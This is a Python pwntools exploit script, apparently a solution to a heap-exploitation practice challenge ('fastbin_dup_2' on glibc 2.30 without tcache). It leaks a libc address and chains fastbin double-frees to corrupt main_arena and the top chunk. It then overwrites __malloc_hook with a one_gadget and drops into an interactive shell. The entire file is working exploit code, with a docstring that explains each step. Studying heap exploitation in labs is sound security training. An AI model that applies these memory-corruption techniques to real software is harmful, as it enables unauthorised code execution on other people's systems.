#!/usr/bin/python
from pwn import *


def malloc(p, size, data):
    p.sendafter('>', b'1')
    p.sendafter('size:', size)
    p.sendafter('data:', data)

def free(p, index):
    p.sendafter('>', b'2')
    p.sendafter('index:', index)

def main(p, libc):
    '''Get size value into main arena via fastbin dup.
       Then use arena address as pointer (now with valid size thanks to our setup) 
       Overwrite top chunk to point near malloc hook (make sure size ends up okay)
       Overwrite malloc hook with one gadget
       Ensure rsp+0x50 points at -s to deal with non-ideal one gadget
    '''
    main_arena = libc.address + 0x3B4B60
    malloc_attack = libc.address + 0x3B4B2C
    one_gadget = libc.address + 0xe1fa1

    malloc(p, b'0x48', b'DDDDDDDD')
    malloc(p, b'0x48', b'BBBBBBBB')
    malloc(p, b'0x78', b'CCCCCCCC')
    malloc(p, b'0x78', b'AAAAAAAA')
    free(p, b'0')
    free(p, b'1')
    free(p, b'0')
    free(p, b'2')
    free(p, b'3')
    free(p, b'2')
    malloc(p, b'0x78', p64(0x51))
    malloc(p, b'0x78', p64(0))
    malloc(p, b'0x78', b'-s\0') # Neat trick to deal with one-gadget issues
    malloc(p, b'0x48', p64(main_arena + 0x38))
    malloc(p, b'0x48', b'DDDDDDDD')
    malloc(p, b'0x48', p64(0))
    malloc(p, b'0x48', p64(0) + p64(0) + p64(0) + p64(malloc_attack))
    malloc(p, b'0x58', b'AAAA' + p64(0)*2 + p64(one_gadget))


bin = ELF('fastbin_dup_2')
libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6')

p = bin.process()
#p = bin.debug([], '''
#c
#''')

p.recvuntil('@')
puts = int(p.recvline().strip(), 16)
libc.address = puts - libc.symbols['puts']
print("libc addr:", hex(libc.address))
main(p, libc)

p.interactive()